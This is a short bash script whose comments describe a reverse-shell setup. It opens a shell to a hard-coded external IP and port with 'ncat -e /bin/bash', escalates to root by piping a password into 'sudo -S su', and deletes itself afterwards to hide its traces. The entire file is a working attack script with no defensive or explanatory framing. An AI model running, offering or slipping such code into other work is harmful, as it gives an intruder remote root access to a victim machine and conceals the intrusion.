#!/bin/bash

# rev shell setup
ncat -e /bin/bash 172.24.9.106 1558

# rev shell privileges
echo "<PASSWORD>" | sudo -S su

# rm script
rm -- "$0"
